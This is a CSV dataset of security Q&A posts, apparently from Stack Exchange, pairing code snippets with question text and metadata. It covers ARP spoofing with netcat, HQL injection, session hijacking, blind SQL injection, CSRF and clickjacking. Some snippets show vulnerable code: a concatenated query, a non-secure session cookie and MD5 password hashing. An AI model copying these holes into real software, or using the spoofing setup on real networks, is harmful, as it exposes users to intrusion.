,CODE,TEXT,code_token_length,text_token_length,security_terms_count,has_code_construct
107,"nc -p 5555 -l # Run on target B, listen on port 5555
nc -p 5555 -l # Run same thing on attack machine
nc 8.0.0.3 5555 # Run on A; connect to B.
","I am doing ARP Spoof experimentation with arpspoof and have successfully set up a man in the middle between two machines. We set up IP Forwarding using: {code-blk}.  The issue is that the IP layer does not respond to a packet meant for another IP address; so although C receives the packet at a lower level, it does not get passed ""up"" the stack.  My goal is to get this up the stack.",58,100,2,True
113,"while (true) do\
    echo -n `date +%s.%N`;\
    free | awk '!/shared/ { ORS=""""; print ""\t"" $3 ""\t"" $4; }';\
    echo;\
    sleep 0.99;\
done >> ~/memory_use_log.csv &
","Can someone whose Linux system is under DDoS attacks give me exact data on the effects of the Low Orbit Ion Cannon (LOIC), the High Orbit Ion Cannon (HOIC), Slowloris, PyLoris, Hping etc. on memory use under Linux? Basically, I'd like timestamped physical memory, buffers/cache, and swap usage statistics in 1-second intervals during various DDoS attacks. These can be generated by issuing the following command in BASH: {code-blk} I ask, because I have realized that my program - swapd ( , , , , ... ) - has found new use on cheap low-memory-low-disk-space Virtual Private Servers (VPS), so I am considering implementing the Allocation Vector technology that I invented in 2001, but never implemented into swapd as swapds' use was subsiding with increasing memory and disk space availability. It has also occured to me that maybe some DDoS tools have considerable effect on memory use under Linux. Before I released swapd in 2000, I tested its' local-attack tolerance by allocating memory at several MiB/s on a Pentium II - I could only slow down the system, but not crash it. So, I'd like to know how various DDoS tools effect memory use under Linux so that I can implement a counter-mechanism when implementing Allocation Vector technology, after which swapd (to be renamed to dswapd) will no longer require swap file size etc. parameters and, basically, any beginner will be able to use it just by specifying directories and maximum allowed disk space use per directory - everything else will be determined using Allocation Vector technology.",86,396,1,True
129,"   In general, certificate policies that appear in the
   issuerDomainPolicy field of the policy mappings extension are not
   considered acceptable policies for inclusion in subsequent
   certificates in the certification path.
","So I'm a little confused how  work.  So let's say the following depicts my cert chain: {code-blk} How could that even be?  If root CA, in the above diagram, has an issuerDomainPolicy, that's pretty much saying that the intermediary CA's policy should be the same, isn't it?",37,81,1,True
147,"public List findByItemProp(String propName, Object value){
   try{
     String qs = ""from ItemTypes as model where model.""+ propName +""= ?""; /* <-- flagged by Fortify */
     Query qo = getSession().createQuery(qs);
     qo.setParameter(0, value);
     return qo.list();
   } catch (){}
 }
","I am using Fortify 360 to analyze my code's security. Fortify has identified a Hibernate based delete method to perform a delete based on an object that has been passed in. My understanding of hibernate is that hibernate will delete a row in the table the object is associated with based on the objects id (the id is a number). Fortify has flagged this as SQL Injection:Hibernate(Input Validation and Representation, Data Flow). Fortify does not seem to like that Hibernate is executing a dynamic SQL statement using unvalidated input. Would a certain fix be required or just caveat this as a mitigated risk? {code-blk}",109,170,1,True
153,"  Cookie cookie = new Cookie(""JSESSIONID"", request.getSession().getId());
  cookie.setMaxAge(-1);
  cookie.setSecure(false);
  cookie.setPath(request.getContextPath());
  response.addCookie(cookie);
","I am developing a web app, which makes HTTP calls as long as the user is not logged in. Once the user clicks the login button, he is sent to a ""login page"" that is HTTPS. The login makes an Ajax call to a servlet, where some specific attributes are added to the session. Then, to solve the problem of ""session fixation"", the current session is invalidated and a new session is created. After login, the user is redirected to the application page but using HTTP. Now in order not to lose the session attributes (between HTTPS and HTTP) I overrode the default Glassfish mechanism by caching the JSESSIONID cookie and sending it in response: (this is a j2ee application) {code-blk} It works fine, but I have been reading on Stack Overflow,  and generally online that the session could still be hijacked. For example  mentions that is a very bad idea, and that a man in the middle can hijack it. I am no security expert, but I would like your feedback on the following mechanism which I built: When typing web app URL, the first landing page is HTTP. All the mechanisms are HTTP. When the user decides to ""login"", he is redirected to a page, and that ""landing"" page is HTTPS (enforced through j2ee CONFIDENTIAL security constraint) On servlet, session fixation is taken care of by invalidating session and creating a new one. Then session attributes are added. In order not to lose session attributes while returning to HTTP, a cookie is manually overridden with the same ""Session ID"", and set to ""non secure"". All app requests are HTTP again. Is this still an easy target for session hijacking / MITM / or any other security flaws? I would appreciate feedback as I am not very experienced with security details.",74,433,2,True
164,"Juniper ---> uplink
|
SWITCH ---> vlan 20 > connected via trunk cable
|
PC - Gigbait Ethernet card (belongs to vlan20)
","I'm stuck in between a very bad cocktail mix of two very desperate technologies. One is Nessus and other is a Juniper EX2200. When I'm running the two together, the NIC on my HP MiniTower 6200 Pro shuts down completely. This happens roughly 2-3 minutes into the Nessus scan. My environment is that I have a Juniper switch set up along with SSG-5, which provides the gateway for the lab-test environment. Firewall is working in NAT mode. Rough description of my problem environment is: {code-blk} It is a link layer protocol message coming from the Juniper switch. Also, if I run the scan using uplink direct connected into my NIC card I do not get a problem. I'm thinking that there is some kind of update sent from switch to my access port which shuts down the NIC card, something like STP updates. Right now, I haven't disabled such updates because I really don't know what is causing it. Also, please suggest any troubleshooting steps / commands I can run on switch device. update I just resolved the problem as I just found that VMWare networking service was sending in VTP updates through my machine access port, doing so resulted in core switch putting my port into blocking mode. With this solved, is there a way I can prevent this from happening at the switch level instead of just disabling VMWare services?",41,323,1,True
179,"System.Security.SecurityException: The source was not found, but some or all event logs could not be searched.  Inaccessible logs: Security.
   at System.Diagnostics.EventLog.FindSourceRegistration(String source, String machineName, Boolean readOnly)
   at System.Diagnostics.EventLog.SourceExists(String source, String machineName)
   at System.Diagnostics.EventLog.VerifyAndCreateSource(String sourceName, String currentMachineName)
   at System.Diagnostics.EventLog.WriteEntry(String message, EventLogEntryType type, Int32 eventID, Int16 category, Byte[] rawData)
   at System.Diagnostics.EventLog.WriteEntry(String source, String message, EventLogEntryType type, Int32 eventID, Int16 category, Byte[] rawData)
   at System.Diagnostics.EventLog.WriteEntry(String source, String message, EventLogEntryType type, Int32 eventID)
   at **YOUR.CUSTOM.BROKEN.CODE.HERE(ResolvedMessageEventSource source, QueuedMessageEventArgs e) in c:\test2\YourProjectHere\Class1.cs:line 116**

 ----  SNIP Possibly more stuff here --
System.Threading._ThreadPoolWaitCallback.PerformWaitCallbackInternal(_ThreadPoolWaitCallback tpWaitCallBack)
   at System.Threading._ThreadPoolWaitCallback.PerformWaitCallback(Object state)
The Zone of the assembly that failed was:
MyComputer
","Background Many developers are unnecessarily lowering the security of the event log, or requiring applications to run in Administrator mode just so they can use the event log with this C# or VB code: {code-blk} Microsoft is aware of this issue, but it is  for quick and dirty EventLog access.  Every time  is called, the system will enumerate the registry and look for the ""Sourcename"" the application specified.  If it doesn't exist then it will be created. The problem is that during enumeration, the Security log is hit,and an exception is thrown.  Developers who don't create an installer, or otherwise create a registry key for ""MyBadApp"" will fall back on the dynamic event creation will see this issue. This is by design and affects  and less frequently   (WriteEvent developers usually create an installer) Solution There are 3 solutions I'm aware of: Make the application run as Administrator (bad) Change the permissions on the registry keys Create an installer that makes the registry key for the application (best solution) Question What is the worst that can happen for an application that changes the permissions of the Security Registry key? Can it read the Security event log? Can it change or modify entries of the Security event log? Can it spoof security events that aren't its own? Can that lead to a DoS?",439,303,2,True
180,"is first letter A? --> NO
is first letter B? --> YES
is second letter A? --> NO
...
is last letter X? --> YES
",Blind SQL Injection is based on TRUE/FALSE tests. Here is an example: {code-blk} It's not a fast method. Do you know something better to guess the word from the database faster?,43,52,1,True
187,"    -A INPUT -p udp -m udp -m u32 ! --u32 0x1c=0xffffffff -j ACCEPT 

    -A INPUT -p udp -m udp -m recent --set --name Total --rsource 
    -A INPUT -p udp -m udp -m recent --update --seconds 1 --hitcount 20 --name Total --rsource -j DROP
","I've achieved a lot on blocking attacks on GameServers but I'm stuck on something. I've blocked major requests of game-server which it aceepts in the form ""\xff\xff\xff\xff"" which can be followed by the actual queries like {code-blk} Now where the rule does accept the clients but it only blocks requests in the form ""\xff\xff\xff\xff getstatus "" ( by which GameServer replies with status ) and not just ""getstatus "" ( by which GameServer replies with disconnect packet ). So I suppose the accept rule is accepting the simple ""string"" as well. I actually want it to also block the non-(\xff) queries. So how do I modify the rule?",131,186,1,True
189,">>> hashlib.md5(""This is a really really long text string to make a hash out of"").hexdigest()
'2916991b5ebba69ab38a84a0a72b4176'

>>> hashlib.md5(""Short"").hexdigest()
'30bb747c98bccdd11b3f89e644c4d0ad'
","Possible Duplicate: Many hashing algorithms seem to have fixed-length message digest as output. If I compute the md5 hash of two strings: {code-blk} I get an output that is 32 characters long for each, even though there is a significant difference in the lengths of the inputs.  Is it theoretically possible that I could come up with two (or more) completely different inputs that generate the same output, since there are infinite possibilities for an input and only a finite number of characters to work with for the output? If yes, what is the likelihood of finding another input that would generate the same output?",109,141,1,True
194,"Accept: */*
Accept-Language: en-us
Accept-Encoding: gzip, deflate
Connection: Close
","My personal Apache server occasionally gets some pretty obvious scans for vulnerabilities.  The client that does the scanning does GET HTTP/1.1 methods on a variety of URLs, and uses a variety of User-Agent fields.  The scanner seems to always use the following HTTP headers in every request (not necessarily in this order): {code-blk} I've tried some of the open source web client libraries (Perl's libwww-perl, PHP's curl library, Python, wget, pmapwn, maybe a few others) but by default, nothing I've tried generates HTTP requests with that combination of Accept, Accept-Language and Accept-Encoding header values. Based on Nmap operating system identification shortly after scans, and p0f passive identification, the client or scanner most probably runs on Linux. What HTTP client or vulnerability scanner generates GET requests with those header values?  Can anyone point me to the source code for it? EDIT I'll give more info.  The User-Agent field on this scanner sometimes shows up as ""Morfeus Fucking Scanner"", ""Morfeus"", ""ZmEu"", ""Made by ZmEu @ WhiteHat Team - www.whitehat.ro"", and possibly others.  No, it's not the pmapwn scanner that has had ""ZmEu"" as its User-Agent sometimes.",31,321,1,True
207,"openssl req -batch -newkey rsa:1024 -keyout KEY.key -out KEY.csr \
  -nodes -config openssl.cnf &&\
openssl x509 -req -sha1 -days 1000 -in KEY.csr -CA ca.crt -CAkey ca.key \
  -set_serial 1 -out KEY.crt -setalias ""FRIENDLY_NAME"" \
  -clrtrust -addtrust emailProtection \
  -addreject clientAuth -addreject serverAuth -trustout &&\
openssl pkcs12 -export -in KEY.crt -inkey KEY.key"" -out KEY.p12 \
  -name ""FRIENDLY_NAME"" -passout pass:PASSWD &&\
chmod 0600 KEY_CN.{key,p12} &>/dev/null

[ usr_cert ]
basicConstraints = CA:FALSE
authorityKeyIdentifier = keyid
subjectKeyIdentifier = hash
keyUsage = critical, digitalSignature, keyEncipherment
extendedKeyUsage = critical, emailProtection
subjectAltName = email:copy
authorityKeyIdentifier = keyid
subjectKeyIdentifier = hash
","I need to create a certificate for email encryption and signing that has to be used by Outlook 2003+. I'm using OpenSSL, my self-signed root-CA is already imported into the trusted root-CA store. These are my steps to create a p12 Identity file importable by Outlook: {code-blk} cli option in the 3rd openssl-statement above. My problem: Outlook still chokes on this (it's valid in Thunderbird, though). I don't have the English error message (could provide the German one, though), these are the rough translations of the dialogs I see: ""Grant usage of a key to the application: Grant / do not grant"" (you may show key details in the lower left - it says there is no description and no context information) ""Repeat the procedure. The protected key cannot be accessed, make sure the specified password is valid."" (I did - I even tried every possible variation of password/no password in openssl and Outlook! For the next step, I'm led back to the first dialog and click ""Cancel"") ""Error in the underlying security system. Access denied!"" My current setup in Outlook: Sign emails, transfer text and signature in plaintext and attach the certificate. I also restricted the certificates usage to secureEmail and disabled OCSP. When importing the certificate (and on generation) I used the exact same password for every password request and the same description as friendlyName, CN and alias (maybe these can be different, I just didn't want to risk anything while trying). I really don't get what Outlook doesn't like / wants to tell me. If needed, I will gladly provide additional details. Thanks!",364,389,1,True
221,"session_start();

if (isset($_SESSION['fingerprint']))
    if ($_SESSION['fingerprint'] != md5($_SERVER['HTTP_USER_AGENT'].'SECRETSALT'))          
        exit; // prompt for password
else
    $_SESSION['fingerprint'] = md5($_SERVER['HTTP_USER_AGENT'].'SECRETSALT');

if ($_POST['password'] == $db_password)
{
    $_SESSION['logged_in'] = true;
    redirect_to_protected_area();
}
else
    // show login again

if (!isset($_SESSION['logged_in']) OR !$_SESSION['logged_in'])
    exit; // prompt for password
else
    // show protected area
","I came across a session management class in PHP which encrypts session data in the session storage folder (i.e., {code-blk}). Can he actually log himself in or he must first ""crack"" the md5? Note: md5 was used to simplify example, a much better hashing algo is used in real life.",224,86,1,True
232,"<?php
$tokenVal = md5(uniqid(mt_rand(), true));
setcookie (""token"", $tokenVal);
?>
<form action=""target.php"" method=""post"" name=""abc"">
<input type=""text"" name=""city"" id=""city"" value=""abc"" size=""25"" maxlength=""10"">
<input type=""hidden"" name=""csrf"" value=""<?php echo $tokenVal; ?>"">
<a class=""cssButton buttonColor right"" id=""billToSubmit"">Save</a>
</form>

if($_POST['csrf'] == $_COOKIE['token']) {
//process further
} else {
die(""Invalid form source"")
}
","I'm using anti-CSRF tokens on all my forms to prevent CSRF attacks. Also, the tokens are being saved in the $_COOKIE variable to validate against the value I get from the form. I'm resetting the token each time a form is loaded. But there are a few forms that are using $.post, i.e. AJAX to submit and getting a JSON response. The $_COOKIE variable is not set because of AJAX being used. Is there a workaround or am I doing something wrong? EDIT: Adding client-side and server-side code sample Client-side: {code-blk} The form is being submitted using $.post. The problem I'm facing is that $_POST['csrf'] is never equal to $_COOKIE['token']!",216,200,1,True
234,"<html>
<head>
<script type=""text/javascript"">
if(top != self) top.location.replace(location);
</script>
</head>
<body bgcolor=""red"">
<img src=""kitten.jpg"" width=""100%"" height=""100%"">
</body>
</html>

<html>
<body>
<center><iframe src=""noIFrame.htm"" border=1>    </center>
</body>
</html>

<html>
<body>
<center><iframe src=""noIFrame.htm"" security=""restricted"" border=1></center>
</body>
</html>
","The Security attribute was implemented to prevent XSS attacks in iFrames by disabling any JS implemented in the iFrame source, therefore indeed eliminating XSS attacks, but also disabling any security scripts like frame busters, killers & etc. For example, here are three pages: Victims Page {code-blk} Finally, this page demonstrates implementing the security attribute. The iFrame is loaded, and since the attribute is set to restricted the frame busting script is not redirecting the browser to the victims page location. Note this attack is viable only in IE8 and above. Now assuming a malicious user can upload files to the victims web server*, (disabling by my understanding the possible use of X-Frame-Options) how can the victim protect his website from click jacking attacks against his IE users? *This is an hypothetical question, of course if attacker has access to the web server domain he would attack differently.",197,226,1,True
256,"MD5(MD5(username + "":"" + REALM + "":"" + password)
    + "":"" + NONCE + "":"" +
    MD5(http-method) + "":"" + uri))
","As far as I understand the answer at , client nonces are meant to prevent attackers from amortizing the costs of brute-force hash computations by being able to reuse the computations results for multiple users and/or for multiple servers However, even in the simplest Digest Authentication variant (qop = none), the {code-blk}, and thus would globally unique, however, that depends on the client's implementation and whereas Opera implements it that way, the versions of Chrome, IE, Firefox I tested do not, and rather just use '/path?query' (afaict this is in violation of ). So whether a precomputed table would be reusable across servers depends on the client implementation, and if the MITM can choose, it will of course prefer the weaker browsers to Opera, if he has a precomputed table.",51,203,2,True
265,"username += ""a long random string literal here"";
        username = username.toUpperCase();
        md = MessageDigest.getInstance(""SHA-256"");
           md.update(username.getBytes());
            byte[] mdbytes = md.digest();
","So I'm trying to think of a good way to check if the license key a user supplies for a program is legit or not. Let's suppose this is the way they get there license They make some type of purchase. A server generates a license based on their username Server gives license to user When user tries to use program for the first time, they use said license key Server checks to see if the license is legit. The parts I have a question of is what's a good way to generate a ""secure"" license with just a username. Currently I have something similar to this on a Java server. {code-blk} So as you can see, I'm adding a long random string to the username, and then making it case insensitive by changing it to uppercase. I'm using SHA on the edited username. So what exactly are the weak points in this? Is their a better way to check licenses? Obviously the client would never see the generation method, so I don't see how they could generate their own licenses unless they obtained the string I'm adding to the username.",80,255,1,True
292,"-D_FORTIFY_SOURCE=2
-fstack-protector --param ssp-buffer-size=4
-fPIE -pie
-Wl,-z,relro,-z,now (ld -z relro and ld -z now)
","What set of GCC options provide the best protection against memory corruption vulnerabilities such as Buffer Overflows, and Dangling Pointers? Does GCC provide any type of ROP chain mitigation? Are there performance concerns or other issues that would prevent this GCC option from being on a mission critical application? I am looking at the  as well as .  Here are the following configurations I am considering: {code-blk} Are there any improvments that can be made to this set of options? We are most worried about protecting WebKit.",80,119,1,True
297,"$salt = ""hello"";
$password = ""password"";
$newpassword = md5($salt.$password); //lets assume the result is 1234567890
",I am making a web app and I'm now stuck on making the login secure. I'm thinking of adding a salt to a user-inputted password and then hash it. (md5 or sha for example) and then I will reshuffle the results. eg: {code-blk} Does this make the password more secure? Please don't suggest some hardcore encryption stuffs. I just need something that will make the passwords secure than just having them encrypted using a cracked hash algorithm.,47,120,1,True
299,"Certificate  ::=  SEQUENCE  {
     tbsCertificate       TBSCertificate,
     signatureAlgorithm   AlgorithmIdentifier,
     signature            BIT STRING  }

TBSCertificate  ::=  SEQUENCE  {
     version         [0]  Version DEFAULT v1,
     serialNumber         CertificateSerialNumber,
     signature            AlgorithmIdentifier,
",From the X.509 RFC: {code-blk} Seems to me that  tbsCertificate -> signature and signatureAlgorithm are redundant?  That they should always be the same? As such why include both? Why not just include one or the other?,95,69,1,True
